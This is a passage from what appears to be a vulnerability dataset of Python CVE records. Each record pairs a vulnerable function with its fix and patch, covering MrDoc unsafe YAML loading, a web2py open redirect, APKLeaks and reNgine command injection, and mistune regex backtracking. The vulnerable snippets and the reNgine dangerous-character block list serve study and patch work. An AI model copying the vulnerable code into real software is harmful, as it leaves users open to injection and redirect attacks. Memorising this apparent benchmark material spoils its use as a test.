        "snippet": "    def read_zip(self,zip_file_path,create_user):\n        # \\u5bfc\\u5165\\u6d41\\u7a0b\\uff1a\n        # 1\\u3001\\u89e3\\u538bzip\\u538b\\u7f29\\u5305\\u6587\\u4ef6\\u5230temp\\u6587\\u4ef6\\u5939\n        # 2\\u3001\\u904d\\u5386temp\\u6587\\u4ef6\\u5939\\u5185\\u7684\\u89e3\\u538b\\u540e\\u7684.md\\u6587\\u4ef6\n        # 3\\u3001\\u8bfb\\u53d6.md\\u6587\\u4ef6\\u7684\\u6587\\u672c\\u5185\\u5bb9\n        # 4\\u3001\\u5982\\u679c\\u91cc\\u9762\\u5339\\u914d\\u5230\\u76f8\\u5bf9\\u8def\\u5f84\\u7684\\u9759\\u6001\\u6587\\u4ef6\\uff0c\\u4ece\\u6307\\u5b9a\\u6587\\u4ef6\\u5939\\u91cc\\u9762\\u8bfb\\u53d6\n        # 5\\u3001\\u4e0a\\u4f20\\u56fe\\u7247\\uff0c\\u5199\\u5165\\u6570\\u636e\\u5e93\\uff0c\\u4fee\\u6539.md\\u6587\\u4ef6\\u91cc\\u9762\\u7684url\\u8def\\u5f84\n\n        # \\u65b0\\u5efa\\u4e00\\u4e2a\\u4e34\\u65f6\\u6587\\u4ef6\\u5939\\uff0c\\u7528\\u4e8e\\u5b58\\u653e\\u89e3\\u538b\\u7684\\u6587\\u4ef6\n        self.temp_dir = zip_file_path[:-3]\n        os.mkdir(self.temp_dir)\n        # \\u89e3\\u538b zip \\u6587\\u4ef6\\u5230\\u6307\\u5b9a\\u4e34\\u65f6\\u6587\\u4ef6\\u5939\n        shutil.unpack_archive(zip_file_path, extract_dir=self.temp_dir)\n\n        # \\u5904\\u7406\\u6587\\u4ef6\\u5939\\u548c\\u6587\\u4ef6\\u540d\\u7684\\u4e2d\\u6587\\u4e71\\u7801\n        for root, dirs, files in os.walk(self.temp_dir):\n            for dir in dirs:\n                try:\n                    new_dir = dir.encode('cp437').decode('gbk')\n                except:\n                    new_dir = dir.encode('utf-8').decode('utf-8')\n                # print(new_dir)\n                os.rename(os.path.join(root, dir), os.path.join(root, new_dir))\n\n            for file in files:\n                try:\n                    new_file = file.encode('cp437').decode('gbk')\n                except:\n                    new_file = file.encode('utf-8').decode('utf-8')\n                # print(root, new_file)\n                os.rename(os.path.join(root, file), os.path.join(root, new_file))\n\n        # \\u8bfb\\u53d6yaml\\u6587\\u4ef6\n        try:\n            with open(os.path.join(self.temp_dir ,'mrdoc.yaml'),'r',encoding='utf-8') as yaml_file:\n                yaml_str = yaml.safe_load(yaml_file.read())\n                project_name = yaml_str['project_name'] \\\n                    if 'project_name' in yaml_str.keys() else zip_file_path[:-4].split('/')[-1]\n                project_desc = yaml_str['project_desc'] if 'project_desc' in yaml_str.keys() else ''\n                project_role = yaml_str['project_role'] if 'project_role' in yaml_str.keys() else 1\n                editor_mode = yaml_str['editor_mode'] if 'editor_mode' in yaml_str.keys() else 1\n                project_toc = yaml_str['toc']\n                toc_item_list = []\n                for toc in project_toc:\n                    # print(toc)\n                    item = {\n                        'name': toc['name'],\n                        'file': toc['file'],\n                        'parent': 0,\n                    }\n                    toc_item_list.append(item)\n                    if 'children' in toc.keys():\n                        for b in toc['children']:\n                            item = {\n                                'name': b['name'],\n                                'file': b['file'],\n                                'parent': toc['name']\n                            }\n                            toc_item_list.append(item)\n                            if 'children' in b.keys():\n                                for c in b['children']:\n                                    item = {\n                                        'name': c['name'],\n                                        'file': c['file'],\n                                        'parent': b['name']\n                                    }\n                                    toc_item_list.append(item)\n\n\n        except:\n            logger.error(_(\"\\u672a\\u53d1\\u73b0yaml\\u6587\\u4ef6\"))\n            project_name = zip_file_path[:-4].split('/')[-1]\n            project_desc = ''\n            project_role = 1\n            editor_mode = 1\n            project_toc = False\n\n        # \\u5f00\\u542f\\u4e8b\\u52a1\n        with transaction.atomic():\n            save_id = transaction.savepoint()\n            try:\n                # \\u65b0\\u5efa\\u6587\\u96c6\n                project = Project.objects.create(\n                    name=project_name,\n                    intro=project_desc,\n                    role=project_role,\n                    create_user=create_user\n                )\n                if project_toc is False:\n                    # \\u904d\\u5386\\u4e34\\u65f6\\u6587\\u4ef6\\u5939\\u4e2d\\u7684\\u6240\\u6709\\u6587\\u4ef6\\u548c\\u6587\\u4ef6\\u5939\n                    for f in os.listdir(self.temp_dir):\n                        # \\u83b7\\u53d6 .md \\u6587\\u4ef6\n                        if f.endswith('.md'):\n                            # print(f)\n                            # \\u8bfb\\u53d6 .md \\u6587\\u4ef6\\u6587\\u672c\\u5185\\u5bb9\n                            with open(os.path.join(self.temp_dir,f),'r',encoding='utf-8') as md_file:\n                                md_content = md_file.read()\n                                md_content = self.operat_md_media(md_content,create_user)\n                                # \\u65b0\\u5efa\\u6587\\u6863\n                                doc = Doc.objects.create(\n                                    name = f[:-3],\n                                    pre_content = md_content,\n                                    top_doc = project.id,\n                                    status = 0,\n                                    editor_mode = editor_mode,\n                                    create_user = create_user\n                                )\n                else:\n                    for i in toc_item_list:\n                        with open(os.path.join(self.temp_dir,i['file']),'r',encoding='utf-8') as md_file:\n                            md_content = md_file.read()\n                            md_content = self.operat_md_media(md_content, create_user)\n                            # \\u65b0\\u5efa\\u6587\\u6863\n                            doc = Doc.objects.create(\n                                name=i['name'],\n                                pre_content=md_content,\n                                top_doc=project.id,\n                                parent_doc = (Doc.objects.get(top_doc=project.id,name=i['parent'])).id \\\n                                    if i['parent'] != 0 else 0,\n                                status=0,\n                                editor_mode=editor_mode,\n                                create_user=create_user\n                            )\n            except:\n                logger.exception(_(\"\\u89e3\\u6790\\u5bfc\\u5165\\u6587\\u4ef6\\u5f02\\u5e38\"))\n                # \\u56de\\u6eda\\u4e8b\\u52a1\n                transaction.savepoint_rollback(save_id)\n\n            transaction.savepoint_commit(save_id)\n        try:\n            shutil.rmtree(self.temp_dir)\n            os.remove(zip_file_path)\n            return project.id\n        except:\n            logger.exception(_(\"\\u5220\\u9664\\u4e34\\u65f6\\u6587\\u4ef6\\u5f02\\u5e38\"))\n            return None"
      }
    ],
    "vul_patch": "--- a/app_doc/import_utils.py\n+++ b/app_doc/import_utils.py\n@@ -33,7 +33,7 @@\n         # \\u8bfb\\u53d6yaml\\u6587\\u4ef6\n         try:\n             with open(os.path.join(self.temp_dir ,'mrdoc.yaml'),'r',encoding='utf-8') as yaml_file:\n-                yaml_str = yaml.load(yaml_file.read())\n+                yaml_str = yaml.safe_load(yaml_file.read())\n                 project_name = yaml_str['project_name'] \\\n                     if 'project_name' in yaml_str.keys() else zip_file_path[:-4].split('/')[-1]\n                 project_desc = yaml_str['project_desc'] if 'project_desc' in yaml_str.keys() else ''\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-33146",
    "cve_description": "Open redirect vulnerability in web2py versions prior to 2.22.5 allows a remote attacker to redirect a user to an arbitrary web site and conduct a phishing attack by having a user to access a specially crafted URL.",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/web2py/web2py",
    "patch_url": [
      "https://github.com/web2py/web2py/commit/a181b855a43cb8b479d276b082cfcde385768451",
      "https://github.com/web2py/web2py/commit/d9805606f88f00c0be56438247605cefde73e14e#diff-c1d01f37ee54d813815718760b9c4d7b274e2be7ad18f65552cd564336ab593bR110"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_365_1",
        "commit": "842994def40ca565aa954a13aa065d2da1090948",
        "file_path": "applications/admin/controllers/default.py",
        "start_line": 118,
        "end_line": 157,
        "snippet": "def index():\n    \"\"\" Index handler \"\"\"\n\n    send = request.vars.send\n    if DEMO_MODE:\n        session.authorized = True\n        session.last_time = t0\n    if not send:\n        send = URL('site')\n    if session.authorized:\n        redirect(send)\n    elif failed_login_count() >= allowed_number_of_attempts:\n        time.sleep(2 ** allowed_number_of_attempts)\n        raise HTTP(403)\n    elif request.vars.password:\n        if verify_password(request.vars.password[:1024]):\n            session.authorized = True\n            login_record(True)\n\n            if CHECK_VERSION:\n                session.check_version = True\n            else:\n                session.check_version = False\n\n            session.last_time = t0\n            if isinstance(send, list):  # ## why does this happen?\n                send = str(send[0])\n\n            redirect(send)\n        else:\n            times_denied = login_record(False)\n            if times_denied >= allowed_number_of_attempts:\n                response.flash = \\\n                    T('admin disabled because too many invalid login attempts')\n            elif times_denied == allowed_number_of_attempts - 1:\n                response.flash = \\\n                    T('You have one more login attempt before you are locked out')\n            else:\n                response.flash = T('invalid password.')\n    return dict(send=send)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_365_1",
        "commit": "a181b855a43cb8b479d276b082cfcde385768451",
        "file_path": "applications/admin/controllers/default.py",
        "start_line": 118,
        "end_line": 157,
        "snippet": "def index():\n    \"\"\" Index handler \"\"\"\n\n    send = prevent_open_redirect(request.vars.send)\n    if DEMO_MODE:\n        session.authorized = True\n        session.last_time = t0\n    if not send:\n        send = URL('site')\n    if session.authorized:\n        redirect(send)\n    elif failed_login_count() >= allowed_number_of_attempts:\n        time.sleep(2 ** allowed_number_of_attempts)\n        raise HTTP(403)\n    elif request.vars.password:\n        if verify_password(request.vars.password[:1024]):\n            session.authorized = True\n            login_record(True)\n\n            if CHECK_VERSION:\n                session.check_version = True\n            else:\n                session.check_version = False\n\n            session.last_time = t0\n            if isinstance(send, list):  # ## why does this happen?\n                send = str(send[0])\n\n            redirect(send)\n        else:\n            times_denied = login_record(False)\n            if times_denied >= allowed_number_of_attempts:\n                response.flash = \\\n                    T('admin disabled because too many invalid login attempts')\n            elif times_denied == allowed_number_of_attempts - 1:\n                response.flash = \\\n                    T('You have one more login attempt before you are locked out')\n            else:\n                response.flash = T('invalid password.')\n    return dict(send=send)"
      }
    ],
    "vul_patch": "--- a/applications/admin/controllers/default.py\n+++ b/applications/admin/controllers/default.py\n@@ -1,7 +1,7 @@\n def index():\n     \"\"\" Index handler \"\"\"\n \n-    send = request.vars.send\n+    send = prevent_open_redirect(request.vars.send)\n     if DEMO_MODE:\n         session.authorized = True\n         session.last_time = t0\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-21386",
    "cve_description": "APKLeaks is an open-source project for scanning APK file for URIs, endpoints & secrets. APKLeaks prior to v2.0.3 allows remote attackers to execute arbitrary OS commands via package name inside application manifest. An attacker could include arguments that allow unintended commands or code to be executed, allow sensitive data to be read or modified or could cause other unintended behavior through malicious package name. The problem is fixed in version v2.0.6-dev and above.",
    "cwe_info": {
      "CWE-88": {
        "name": "Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')",
        "description": "The product constructs a string for a command to be executed by a separate component\nin another control sphere, but it does not properly delimit the\nintended arguments, options, or switches within that command string."
      }
    },
    "repo": "https://github.com/dwisiswant0/apkleaks",
    "patch_url": [
      "https://github.com/dwisiswant0/apkleaks/commit/a966e781499ff6fd4eea66876d7532301b13a382"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_294_1",
        "commit": "8577b7a",
        "file_path": "apkleaks/apkleaks.py",
        "start_line": 78,
        "end_line": 89,
        "snippet": "\tdef decompile(self):\n\t\tself.writeln(\"** Decompiling APK...\", clr.OKBLUE)\n\t\twith ZipFile(self.file) as zipped:\n\t\t\ttry:\n\t\t\t\tdex = self.tempdir + \"/\" + self.apk.package + \".dex\"\n\t\t\t\twith open(dex, \"wb\") as classes:\n\t\t\t\t\tclasses.write(zipped.read(\"classes.dex\"))\n\t\t\texcept Exception as e:\n\t\t\t\tsys.exit(self.writeln(str(e), clr.WARNING))\n\t\tdec = \"%s %s -d %s --deobf\" % (self.jadx, dex, self.tempdir)\n\t\tos.system(dec)\n\t\treturn self.tempdir"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_294_1",
        "commit": "a966e781499ff6fd4eea66876d7532301b13a382",
        "file_path": "apkleaks/apkleaks.py",
        "start_line": 79,
        "end_line": 91,
        "snippet": "\tdef decompile(self):\n\t\tself.writeln(\"** Decompiling APK...\", clr.OKBLUE)\n\t\twith ZipFile(self.file) as zipped:\n\t\t\ttry:\n\t\t\t\tdex = self.tempdir + \"/\" + self.apk.package + \".dex\"\n\t\t\t\twith open(dex, \"wb\") as classes:\n\t\t\t\t\tclasses.write(zipped.read(\"classes.dex\"))\n\t\t\texcept Exception as e:\n\t\t\t\tsys.exit(self.writeln(str(e), clr.WARNING))\n\t\targs = [self.jadx, dex, \"-d\", self.tempdir, \"--deobf\"]\n\t\tcomm = \"%s\" % (\" \".join(quote(arg) for arg in args))\n\t\tos.system(comm)\n\t\treturn self.tempdir"
      }
    ],
    "vul_patch": "--- a/apkleaks/apkleaks.py\n+++ b/apkleaks/apkleaks.py\n@@ -7,6 +7,7 @@\n \t\t\t\t\tclasses.write(zipped.read(\"classes.dex\"))\n \t\t\texcept Exception as e:\n \t\t\t\tsys.exit(self.writeln(str(e), clr.WARNING))\n-\t\tdec = \"%s %s -d %s --deobf\" % (self.jadx, dex, self.tempdir)\n-\t\tos.system(dec)\n+\t\targs = [self.jadx, dex, \"-d\", self.tempdir, \"--deobf\"]\n+\t\tcomm = \"%s\" % (\" \".join(quote(arg) for arg in args))\n+\t\tos.system(comm)\n \t\treturn self.tempdir\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2025-24962",
    "cve_description": "reNgine is an automated reconnaissance framework for web applications. In affected versions a user can inject commands via the nmap_cmd parameters. This issue has been addressed in commit `c28e5c8d` and is expected in the next versioned release. Users are advised to filter user input and monitor the project for a new release.",
    "cwe_info": {
      "CWE-74": {
        "name": "Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')",
        "description": "The product constructs all or part of a command, data structure, or record using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify how it is parsed or interpreted when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/yogeshojha/rengine",
    "patch_url": [
      "https://github.com/yogeshojha/rengine/commit/c28e5c8d304478a787811580b4d80b330920ace4"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_326_1",
        "commit": "a658b85",
        "file_path": "web/reNgine/common_func.py",
        "start_line": 907,
        "end_line": 936,
        "snippet": "def get_nmap_cmd(\n\t\tinput_file,\n\t\tcmd=None,\n\t\thost=None,\n\t\tports=None,\n\t\toutput_file=None,\n\t\tscript=None,\n\t\tscript_args=None,\n\t\tmax_rate=None,\n\t\tservice_detection=True,\n\t\tflags=[]):\n\tif not cmd:\n\t\tcmd = 'nmap'\n\n\toptions = {\n\t\t\"-sV\": service_detection,\n\t\t\"-p\": ports,\n\t\t\"--script\": script,\n\t\t\"--script-args\": script_args,\n\t\t\"--max-rate\": max_rate,\n\t\t\"-oX\": output_file\n\t}\n\tcmd = _build_cmd(cmd, options, flags)\n\n\tif not input_file:\n\t\tcmd += f\" {host}\" if host else \"\"\n\telse:\n\t\tcmd += f\" -iL {input_file}\"\n\n\treturn cmd"
      },
      {
        "id": "vul_py_326_2",
        "commit": "a658b85",
        "file_path": "web/reNgine/tasks.py",
        "start_line": 1481,
        "end_line": 1562,
        "snippet": "def nmap(\n\t\tself,\n\t\tcmd=None,\n\t\tports=[],\n\t\thost=None,\n\t\tinput_file=None,\n\t\tscript=None,\n\t\tscript_args=None,\n\t\tmax_rate=None,\n\t\tctx={},\n\t\tdescription=None):\n\t\"\"\"Run nmap on a host.\n\n\tArgs:\n\t\tcmd (str, optional): Existing nmap command to complete.\n\t\tports (list, optional): List of ports to scan.\n\t\thost (str, optional): Host to scan.\n\t\tinput_file (str, optional): Input hosts file.\n\t\tscript (str, optional): NSE script to run.\n\t\tscript_args (str, optional): NSE script args.\n\t\tmax_rate (int): Max rate.\n\t\tdescription (str, optional): Task description shown in UI.\n\t\"\"\"\n\tnotif = Notification.objects.first()\n\tports_str = ','.join(str(port) for port in ports)\n\tself.filename = self.filename.replace('.txt', '.xml')\n\tfilename_vulns = self.filename.replace('.xml', '_vulns.json')\n\toutput_file = self.output_path\n\toutput_file_xml = f'{self.results_dir}/{host}_{self.filename}'\n\tvulns_file = f'{self.results_dir}/{host}_{filename_vulns}'\n\tlogger.warning(f'Running nmap on {host}:{ports}')\n\n\t# Build cmd\n\tnmap_cmd = get_nmap_cmd(\n\t\tcmd=cmd,\n\t\tports=ports_str,\n\t\tscript=script,\n\t\tscript_args=script_args,\n\t\tmax_rate=max_rate,\n\t\thost=host,\n\t\tinput_file=input_file,\n\t\toutput_file=output_file_xml)\n\n\t# Run cmd\n\trun_command(\n\t\tnmap_cmd,\n\t\tshell=True,\n\t\thistory_file=self.history_file,\n\t\tscan_id=self.scan_id,\n\t\tactivity_id=self.activity_id)\n\n\t# Get nmap XML results and convert to JSON\n\tvulns = parse_nmap_results(output_file_xml, output_file)\n\twith open(vulns_file, 'w') as f:\n\t\tjson.dump(vulns, f, indent=4)\n\n\t# Save vulnerabilities found by nmap\n\tvulns_str = ''\n\tfor vuln_data in vulns:\n\t\t# URL is not necessarily an HTTP URL when running nmap (can be any\n\t\t# other vulnerable protocols). Look for existing endpoint and use its\n\t\t# URL as vulnerability.http_url if it exists.\n\t\turl = vuln_data['http_url']\n\t\tendpoint = EndPoint.objects.filter(http_url__contains=url).first()\n\t\tif endpoint:\n\t\t\tvuln_data['http_url'] = endpoint.http_url\n\t\tvuln, created = save_vulnerability(\n\t\t\ttarget_domain=self.domain,\n\t\t\tsubdomain=self.subdomain,\n\t\t\tscan_history=self.scan,\n\t\t\tsubscan=self.subscan,\n\t\t\tendpoint=endpoint,\n\t\t\t**vuln_data)\n\t\tvulns_str += f'\\u2022 {str(vuln)}\\n'\n\t\tif created:\n\t\t\tlogger.warning(str(vuln))\n\n\t# Send only 1 notif for all vulns to reduce number of notifs\n\tif notif and notif.send_vuln_notif and vulns_str:\n\t\tlogger.warning(vulns_str)\n\t\tself.notify(fields={'CVEs': vulns_str})\n\treturn vulns"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_326_1",
        "commit": "c28e5c8d304478a787811580b4d80b330920ace4",
        "file_path": "web/reNgine/common_func.py",
        "start_line": 907,
        "end_line": 941,
        "snippet": "def get_nmap_cmd(\n\t\tinput_file,\n\t\tcmd=None,\n\t\thost=None,\n\t\tports=None,\n\t\toutput_file=None,\n\t\tscript=None,\n\t\tscript_args=None,\n\t\tmax_rate=None,\n\t\tservice_detection=True,\n\t\tflags=[]):\n\tif not cmd:\n\t\tcmd = 'nmap'\n\n\toptions = {\n\t\t\"-sV\": service_detection,\n\t\t\"-p\": ports,\n\t\t\"--script\": script,\n\t\t\"--script-args\": script_args,\n\t\t\"--max-rate\": max_rate,\n\t\t\"-oX\": output_file\n\t}\n\tcmd = _build_cmd(cmd, options, flags)\n\n\tis_nmap_valid = is_valid_nmap_command(cmd)\n\tif not is_nmap_valid:\n\t\tlogger.error(f'Invalid nmap command or potentially dangerous: {cmd}')\n\t\treturn None\n\n\tif not input_file:\n\t\tcmd += f\" {host}\" if host else \"\"\n\telse:\n\t\tcmd += f\" -iL {input_file}\"\n\n\treturn cmd"
      },
      {
        "id": "fix_py_326_2",
        "commit": "c28e5c8d304478a787811580b4d80b330920ace4",
        "file_path": "web/reNgine/tasks.py",
        "start_line": 1481,
        "end_line": 1566,
        "snippet": "def nmap(\n\t\tself,\n\t\tcmd=None,\n\t\tports=[],\n\t\thost=None,\n\t\tinput_file=None,\n\t\tscript=None,\n\t\tscript_args=None,\n\t\tmax_rate=None,\n\t\tctx={},\n\t\tdescription=None):\n\t\"\"\"Run nmap on a host.\n\n\tArgs:\n\t\tcmd (str, optional): Existing nmap command to complete.\n\t\tports (list, optional): List of ports to scan.\n\t\thost (str, optional): Host to scan.\n\t\tinput_file (str, optional): Input hosts file.\n\t\tscript (str, optional): NSE script to run.\n\t\tscript_args (str, optional): NSE script args.\n\t\tmax_rate (int): Max rate.\n\t\tdescription (str, optional): Task description shown in UI.\n\t\"\"\"\n\tnotif = Notification.objects.first()\n\tports_str = ','.join(str(port) for port in ports)\n\tself.filename = self.filename.replace('.txt', '.xml')\n\tfilename_vulns = self.filename.replace('.xml', '_vulns.json')\n\toutput_file = self.output_path\n\toutput_file_xml = f'{self.results_dir}/{host}_{self.filename}'\n\tvulns_file = f'{self.results_dir}/{host}_{filename_vulns}'\n\tlogger.warning(f'Running nmap on {host}:{ports}')\n\n\t# Build cmd\n\tnmap_cmd = get_nmap_cmd(\n\t\tcmd=cmd,\n\t\tports=ports_str,\n\t\tscript=script,\n\t\tscript_args=script_args,\n\t\tmax_rate=max_rate,\n\t\thost=host,\n\t\tinput_file=input_file,\n\t\toutput_file=output_file_xml)\n\t\n\tif not nmap_cmd:\n\t\tlogger.error('Could not build nmap command')\n\t\treturn\n\n\t# Run cmd\n\trun_command(\n\t\tnmap_cmd,\n\t\tshell=True,\n\t\thistory_file=self.history_file,\n\t\tscan_id=self.scan_id,\n\t\tactivity_id=self.activity_id)\n\n\t# Get nmap XML results and convert to JSON\n\tvulns = parse_nmap_results(output_file_xml, output_file)\n\twith open(vulns_file, 'w') as f:\n\t\tjson.dump(vulns, f, indent=4)\n\n\t# Save vulnerabilities found by nmap\n\tvulns_str = ''\n\tfor vuln_data in vulns:\n\t\t# URL is not necessarily an HTTP URL when running nmap (can be any\n\t\t# other vulnerable protocols). Look for existing endpoint and use its\n\t\t# URL as vulnerability.http_url if it exists.\n\t\turl = vuln_data['http_url']\n\t\tendpoint = EndPoint.objects.filter(http_url__contains=url).first()\n\t\tif endpoint:\n\t\t\tvuln_data['http_url'] = endpoint.http_url\n\t\tvuln, created = save_vulnerability(\n\t\t\ttarget_domain=self.domain,\n\t\t\tsubdomain=self.subdomain,\n\t\t\tscan_history=self.scan,\n\t\t\tsubscan=self.subscan,\n\t\t\tendpoint=endpoint,\n\t\t\t**vuln_data)\n\t\tvulns_str += f'\\u2022 {str(vuln)}\\n'\n\t\tif created:\n\t\t\tlogger.warning(str(vuln))\n\n\t# Send only 1 notif for all vulns to reduce number of notifs\n\tif notif and notif.send_vuln_notif and vulns_str:\n\t\tlogger.warning(vulns_str)\n\t\tself.notify(fields={'CVEs': vulns_str})\n\treturn vulns"
      },
      {
        "id": "fix_py_326_3",
        "commit": "c28e5c8d304478a787811580b4d80b330920ace4",
        "file_path": "web/reNgine/common_func.py",
        "start_line": 1656,
        "end_line": 1693,
        "snippet": "def is_valid_nmap_command(cmd):\n\t\"\"\"\n\t\tCheck if the nmap command is valid or not\n\t\tThis is to check the nmap command before executing it so as to avoid\n\t\tcommand injection attacks\n\t\tArgs:\n\t\t\tcmd: str: nmap command\n\t\tReturns:\n\t\t\tbool: True if valid, False otherwise\n\n\t\tAllowing user input in nmap command is by design\n\t\tas user can provide custom nmap command to run\n\t\tbut we need to make sure that the command is safe\n\t\tand doesn't contain any malicious commands\n\t\tWe do this by checking if the command starts with nmap\n\t\tand doesn't contain any dangerous characters, in the most basic form\n\t\"\"\"\n\t# if this is not a valid command nmap command at all, dont even run it\n\tif not cmd.strip().startswith('nmap'):\n\t\treturn False\n\t\n\t# check for dangerous chars\n\tdangerous_chars = {';', '&', '|', '>', '<', '`', '$', '(', ')', '#', '\\\\'}\n\tif any(char in cmd for char in dangerous_chars):\n\t\treturn False\n\t\t\n\t# but we also need to check for flags and options, for example - and -- are allowed\n\tparts = cmd.split()\n\tfor part in parts[1:]: # ignoring nmap the first part of command\n\t\tif part.startswith('-') or part.startswith('--'):\n\t\t\tcontinue\n\t\t\n\t\t# check for valid characters, . - etc are allowed in valid nmap command\n\t\tif all(c.isalnum() or c in '.,/-_' for c in part):\n\t\t\tcontinue\n\t\treturn False\n\t\t\n\treturn True"
      }
    ],
    "vul_patch": "--- a/web/reNgine/common_func.py\n+++ b/web/reNgine/common_func.py\n@@ -22,6 +22,11 @@\n \t}\n \tcmd = _build_cmd(cmd, options, flags)\n \n+\tis_nmap_valid = is_valid_nmap_command(cmd)\n+\tif not is_nmap_valid:\n+\t\tlogger.error(f'Invalid nmap command or potentially dangerous: {cmd}')\n+\t\treturn None\n+\n \tif not input_file:\n \t\tcmd += f\" {host}\" if host else \"\"\n \telse:\n\n--- a/web/reNgine/tasks.py\n+++ b/web/reNgine/tasks.py\n@@ -40,6 +40,10 @@\n \t\thost=host,\n \t\tinput_file=input_file,\n \t\toutput_file=output_file_xml)\n+\t\n+\tif not nmap_cmd:\n+\t\tlogger.error('Could not build nmap command')\n+\t\treturn\n \n \t# Run cmd\n \trun_command(\n\n--- /dev/null\n+++ b/web/reNgine/tasks.py\n@@ -0,0 +1,38 @@\n+def is_valid_nmap_command(cmd):\n+\t\"\"\"\n+\t\tCheck if the nmap command is valid or not\n+\t\tThis is to check the nmap command before executing it so as to avoid\n+\t\tcommand injection attacks\n+\t\tArgs:\n+\t\t\tcmd: str: nmap command\n+\t\tReturns:\n+\t\t\tbool: True if valid, False otherwise\n+\n+\t\tAllowing user input in nmap command is by design\n+\t\tas user can provide custom nmap command to run\n+\t\tbut we need to make sure that the command is safe\n+\t\tand doesn't contain any malicious commands\n+\t\tWe do this by checking if the command starts with nmap\n+\t\tand doesn't contain any dangerous characters, in the most basic form\n+\t\"\"\"\n+\t# if this is not a valid command nmap command at all, dont even run it\n+\tif not cmd.strip().startswith('nmap'):\n+\t\treturn False\n+\t\n+\t# check for dangerous chars\n+\tdangerous_chars = {';', '&', '|', '>', '<', '`', '$', '(', ')', '#', '\\\\'}\n+\tif any(char in cmd for char in dangerous_chars):\n+\t\treturn False\n+\t\t\n+\t# but we also need to check for flags and options, for example - and -- are allowed\n+\tparts = cmd.split()\n+\tfor part in parts[1:]: # ignoring nmap the first part of command\n+\t\tif part.startswith('-') or part.startswith('--'):\n+\t\t\tcontinue\n+\t\t\n+\t\t# check for valid characters, . - etc are allowed in valid nmap command\n+\t\tif all(c.isalnum() or c in '.,/-_' for c in part):\n+\t\t\tcontinue\n+\t\treturn False\n+\t\t\n+\treturn True\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-34749",
    "cve_description": "In mistune through 2.0.2, support of inline markup is implemented by using regular expressions that can involve a high amount of backtracking on certain edge cases. This behavior is commonly named catastrophic backtracking.",
    "cwe_info": {
      "CWE-1333": {
        "name": "Inefficient Regular Expression Complexity",
        "description": "The product uses a regular expression with an inefficient, possibly exponential worst-case computational complexity that consumes excessive CPU cycles."
      }
    },
    "repo": "https://github.com/lepture/mistune",
    "patch_url": [
      "https://github.com/lepture/mistune/commit/a6d43215132fe4f3d93f8d7e90ba83b16a0838b2"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_416_1",
        "commit": "5638e46",
        "file_path": "mistune/inline_parser.py",
        "start_line": 15,
        "end_line": 100,
        "snippet": "class InlineParser(ScannerParser):\n    ESCAPE = ESCAPE_TEXT\n\n    #: link or email syntax::\n    #:\n    #: <https://example.com>\n    AUTO_LINK = (\n        r'(?<!\\\\)(?:\\\\\\\\)*<([A-Za-z][A-Za-z0-9+.-]{1,31}:'\n        r\"[^ <>]*?|[A-Za-z0-9.!#$%&'*+/=?^_`{|}~-]+@[A-Za-z0-9]\"\n        r'(?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?'\n        r'(?:\\.[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?)*)>'\n    )\n\n    #: link or image syntax::\n    #:\n    #: [text](/link \"title\")\n    #: ![alt](/src \"title\")\n    STD_LINK = (\n        r'!?\\[(' + LINK_TEXT + r')\\]\\(\\s*'\n\n        r'(<(?:\\\\[<>]?|[^\\s<>\\\\])*>|'\n        r'(?:\\\\[()]?|\\([^\\s\\x00-\\x1f\\\\]*\\)|[^\\s\\x00-\\x1f()\\\\])*?)'\n\n        r'(?:\\s+('\n        r'''\"(?:\\\\\"?|[^\"\\\\])*\"|'(?:\\\\'?|[^'\\\\])*'|\\((?:\\\\\\)?|[^)\\\\])*\\)'''\n        r'))?\\s*\\)'\n    )\n\n    #: Get link from references. References are defined in DEF_LINK in blocks.\n    #: The syntax looks like::\n    #:\n    #:    [an example][id]\n    #:\n    #:    [id]: https://example.com \"optional title\"\n    REF_LINK = (\n        r'!?\\[(' + LINK_TEXT + r')\\]'\n        r'\\[(' + LINK_LABEL + r')\\]'\n    )\n\n    #: Simple form of reference link::\n    #:\n    #:    [an example]\n    #:\n    #:    [an example]: https://example.com \"optional title\"\n    REF_LINK2 = r'!?\\[(' + LINK_LABEL + r')\\]'\n\n    #: emphasis and strong * or _::\n    #:\n    #:    *emphasis*  **strong**\n    #:    _emphasis_  __strong__\n    ASTERISK_EMPHASIS = (\n        r'(\\*{1,2})(?=[^\\s*])('\n        r'(?:\\\\[\\\\*]|[^*])*'\n        r'(?:' + ESCAPE_TEXT + r'|[^\\s*]))\\1'\n    )\n    UNDERSCORE_EMPHASIS = (\n        r'\\b(_{1,2})(?=[^\\s_])([\\s\\S]*?'\n        r'(?:' + ESCAPE_TEXT + r'|[^\\s_]))\\1'\n        r'(?!_|[^\\s' + PUNCTUATION + r'])\\b'\n    )\n\n    #: codespan with `::\n    #:\n    #:    `code`\n    CODESPAN = (\n        r'(?<!\\\\|`)(?:\\\\\\\\)*(`+)(?!`)([\\s\\S]+?)(?<!`)\\1(?!`)'\n    )\n\n    #: linebreak leaves two spaces at the end of line\n    LINEBREAK = r'(?:\\\\| {2,})\\n(?!\\s*$)'\n\n    INLINE_HTML = (\n        r'(?<!\\\\)<' + HTML_TAGNAME + HTML_ATTRIBUTES + r'\\s*/?>|'  # open tag\n        r'(?<!\\\\)</' + HTML_TAGNAME + r'\\s*>|'  # close tag\n        